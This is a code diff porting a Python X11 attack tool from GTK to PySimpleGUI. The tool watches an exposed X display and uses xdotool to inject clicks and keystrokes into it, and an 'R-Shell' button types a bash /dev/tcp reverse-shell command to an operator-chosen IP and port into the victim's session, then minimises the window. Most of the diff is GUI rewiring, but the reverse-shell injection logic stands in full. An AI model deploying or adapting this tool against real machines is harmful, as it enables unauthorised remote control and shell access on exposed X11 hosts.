@@ -13,11 +13,14 @@ import sys
 import subprocess
 import time
 import re
-import gi
-gi.require_version('Gtk', '3.0')
-gi.require_version('Gdk', '3.0')
-from gi.repository import Gtk, Gdk, cairo
 import socket
+
+try:
+    import PySimpleGUI as sg
+except ImportError:
+    print("Error: PySimpleGUI no está instalado.")
+    print("Instálalo con: pip install PySimpleGUI")
+    sys.exit(1)
 
 class xwin:
 	host = ''
@@ -27,15 +30,15 @@ class xwin:
 	ctrl_state = False
 	alt_state = False
 
-	def on_click(self, widget, event):
-		cmd = 'export DISPLAY={} && xdotool mousemove {} {}'.format(self.host, event.x, event.y)
-		if (event.button == 1):
+	def on_click(self, x, y, button):
+		cmd = 'export DISPLAY={} && xdotool mousemove {} {}'.format(self.host, x, y)
+		if button == 1:
 			cmd += ' click 1'
-		elif (event.button == 3):
+		elif button == 3:
 			cmd += ' click 3'
 		os.system(cmd)
 
-	def string_to_xdo(self, st, entry):
+	def string_to_xdo(self, st, window=None):
 		if (len(st) == 0):
 			return 'Return'
 		st = list(st)
@@ -44,10 +47,14 @@ class xwin:
 			if ch in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890':
 				out += ch + ' '
 			else:
-				out += self.keyspace[ch] + ' '
+				if ch in self.keyspace:
+					out += self.keyspace[ch] + ' '
+				else:
+					out += ch + ' '
 
 		if ((len(out) > 2) and (self.spr_state or self.ctrl_state or self.alt_state)):
-			entry.set_text('SUPER or CTRL or ALT are toggled. Only one character please.')
+			if window:
+				sg.popup_error('SUPER or CTRL or ALT are toggled. Only one character please.')
 			return ''
 		elif (self.spr_state and self.ctrl_state and self.alt_state):
 			out = 'super+ctrl+alt+' + out
@@ -70,11 +77,9 @@ class xwin:
 
 		return out
 
-	def on_shell_clicked(self, button, entry):
-		entry_text = entry.get_text()
-		entry.set_text("")
+	def on_shell_clicked(self, entry_text):
 		if (len(entry_text) == 0):
-			entry.set_text("IP:Port")
+			sg.popup_error("IP:Port")
 			return
 		if ' ' in entry_text:
 			dest = entry_text.split(' ')
@@ -84,118 +89,102 @@ class xwin:
 		os.system(cmd)
 		time.sleep(3)
 		cmd = 'echo "exec 5<>/dev/tcp/{}/{} && cat <&5 | /bin/bash 2>&5 >&5" | /bin/bash'.format(dest[0], dest[1])
-		cmd = 'export DISPLAY={} && xdotool key {}'.format(self.host, self.string_to_xdo(cmd, entry))
+		cmd = 'export DISPLAY={} && xdotool key {}'.format(self.host, self.string_to_xdo(cmd))
 		os.system(cmd)
 		time.sleep(5)
 		cmd = 'export DISPLAY={} && xdotool key Return'.format(self.host)
 		os.system(cmd)
 		cmd = 'export DISPLAY={} && xdotool key ctrl+super+Down'.format(self.host)
 		os.system(cmd)
-		
 
-	def on_backspace_clicked(self, button):
+	def on_backspace_clicked(self):
 		cmd = 'export DISPLAY={} && xdotool key BackSpace'.format(self.host)
 		os.system(cmd)
 
-	def on_enter_clicked(self, button):
+	def on_enter_clicked(self):
 		cmd = 'export DISPLAY={} && xdotool key Return'.format(self.host)
 		os.system(cmd)
 
-	def on_button_toggled(self, button, name):
-		if (button.get_active()):
-			if (name == 'spr'):
-				self.spr_state = True
-			elif (name == 'ctrl'):
-				self.ctrl_state = True
-			elif (name == 'alt'):
-				self.alt_state = True
-		else:
-			if (name == 'spr'):
-				self.spr_state = False
-			elif (name == 'ctrl'):
-				self.ctrl_state = False
-			elif (name == 'alt'):
-				self.alt_state = False
-	
-	def enter_callback(self, widget, entry):
-		entry_text = entry.get_text()
-		entry.set_text("")
-		cmd = 'export DISPLAY={} && xdotool key {}'.format(self.host, self.string_to_xdo(entry_text, entry))
+	def on_button_toggled(self, name):
+		if name == 'spr':
+			self.spr_state = not self.spr_state
+		elif name == 'ctrl':
+			self.ctrl_state = not self.ctrl_state
+		elif name == 'alt':
+			self.alt_state = not self.alt_state
+
+	def enter_callback(self, entry_text):
+		cmd = 'export DISPLAY={} && xdotool key {}'.format(self.host, self.string_to_xdo(entry_text))
 		os.system(cmd)
 
-	def expose(self, widget, cr):
-		cr.set_operator(cairo.OPERATOR_CLEAR)
-		allocation = widget.get_allocation()
-		cr.rectangle(0.0, 0.0, allocation.width, allocation.height)
-		cr.fill()
-
-	def destroy(self, widget, data=None):
+	def destroy(self):
 		if self.xww:
 			os.system("kill {}".format(self.xww.pid + 1))
-		Gtk.main_quit()
-
-	def delete_event(self, widget, event, data=None):
-		return False
 
 	def __init__(self, width, height):
-		self.window = Gtk.Window(Gtk.WindowType.TOPLEVEL)
-		self.window.connect("delete_event", self.delete_event)
-		self.window.connect("destroy", self.destroy)
-		self.window.set_border_width(0)
-		self.window.set_size_request(width, height + 30)
-		self.window.set_app_paintable(True)
+		sg.theme('DarkGray13')
+		
+		layout = [
+			[sg.Canvas(size=(width, height), key='-CANVAS-')],
+			[
+				sg.Input(key='-INPUT-', size=(30, 1)),
+				sg.Button('spr', key='-SPR-'),
+				sg.Button('ctrl', key='-CTRL-'),
+				sg.Button('alt', key='-ALT-'),
+				sg.Button('Enter', key='-ENTER-'),
+				sg.Button('Backspace', key='-BACKSPACE-'),
+				sg.Button('R-Shell', key='-SHELL-'),
+			]
+		]
 
-		self.vbox = Gtk.VBox(homogeneous=False, spacing=5)
-		self.hbox = Gtk.HBox(homogeneous=False, spacing=3)
-		self.bbox = Gtk.HBox(homogeneous=True, spacing=3)
-
-		self.entry = Gtk.Entry()
-		self.entry.set_max_length(0)
-		self.entry.set_size_request(int(width/2), 25)
-		self.entry.connect("activate", self.enter_callback, self.entry)
-		self.spr = Gtk.ToggleButton(label='spr')
-		self.spr.connect("toggled", self.on_button_toggled, 'spr')
-		self.ctrl = Gtk.ToggleButton(label='ctrl')
-		self.ctrl.connect("toggled", self.on_button_toggled, 'ctrl')
-		self.alt = Gtk.ToggleButton(label='alt')
-		self.alt.connect("toggled", self.on_button_toggled, 'alt')
-		self.enter = Gtk.Button(label='Enter')
-		self.enter.connect("clicked", self.on_enter_clicked)
-		self.backspace = Gtk.Button(label='Backspace')
-		self.backspace.connect("clicked", self.on_backspace_clicked)
-		self.shell = Gtk.Button(label='R-Shell')
-		self.shell.connect("clicked", self.on_shell_clicked, self.entry)
-
-		self.hbox.add(self.entry)
-		self.bbox.add(self.spr)
-		self.bbox.add(self.ctrl)
-		self.bbox.add(self.alt)
-		self.bbox.add(self.enter)
-		self.bbox.add(self.backspace)
-		self.bbox.add(self.shell)
-		self.hbox.add(self.bbox)
-
-		self.halign = Gtk.Alignment(xalign=1, yalign=0, xscale=1, yscale=0)
-		self.halign.add(self.hbox)
-
-		self.allalign = Gtk.Alignment(xalign=0, yalign=0, xscale=1, yscale=1)
-		self.clickbox = Gtk.EventBox()
-		self.clickbox.connect('button-press-event', self.on_click)
-		self.clickbox.set_visible_window(False)
-
-		self.allalign.add(self.clickbox)
-		self.vbox.pack_start(self.allalign, True, True, 0)
-
-		self.vbox.pack_end(self.halign, False, False, 0)
-
-		self.window.add(self.vbox)
-
-		self.window.show_all()
-
-		self.window.move(100, 100)
+		self.window = sg.Window('X11 Remote Desktop', layout, size=(width, height + 80), location=(100, 100), finalize=True)
+		
+		canvas = self.window['-CANVAS-'].TKCanvas
+		canvas.bind('<Button-1>', lambda e: self.on_click(e.x, e.y, 1))
+		canvas.bind('<Button-3>', lambda e: self.on_click(e.x, e.y, 3))
 
 	def main(self):
-		Gtk.main()
+		spr_pressed = False
+		ctrl_pressed = False
+		alt_pressed = False
+
+		while True:
+			event, values = self.window.read(timeout=100)
+
+			if event == sg.WINDOW_CLOSED:
+				self.destroy()
+				break
+			
+			if event == '-INPUT-':
+				entry_text = values['-INPUT-']
+				if entry_text:
+					self.enter_callback(entry_text)
+					self.window['-INPUT-'].update('')
+
+			elif event == '-SPR-':
+				self.on_button_toggled('spr')
+				self.window['-SPR-'].update(button_color=('white', 'red' if self.spr_state else None))
+
+			elif event == '-CTRL-':
+				self.on_button_toggled('ctrl')
+				self.window['-CTRL-'].update(button_color=('white', 'red' if self.ctrl_state else None))
+
+			elif event == '-ALT-':
+				self.on_button_toggled('alt')
+				self.window['-ALT-'].update(button_color=('white', 'red' if self.alt_state else None))
+
+			elif event == '-ENTER-':
+				self.on_enter_clicked()
+
+			elif event == '-BACKSPACE-':
+				self.on_backspace_clicked()
+
+			elif event == '-SHELL-':
+				entry_text = values['-INPUT-']
+				self.on_shell_clicked(entry_text)
+				self.window['-INPUT-'].update('')
+
+		self.window.close()
 
 def valid_ip(address):
     try: 
@@ -240,8 +229,11 @@ requirements:
  xwininfo
  xwatchwin
  xdotool
- python3-gi
- gir1.2-gtk-3.0
+ PySimpleGUI (install with: pip install PySimpleGUI)
+
+installation:
+--------------
+ pip install PySimpleGUI
 
 usage:
 --------------
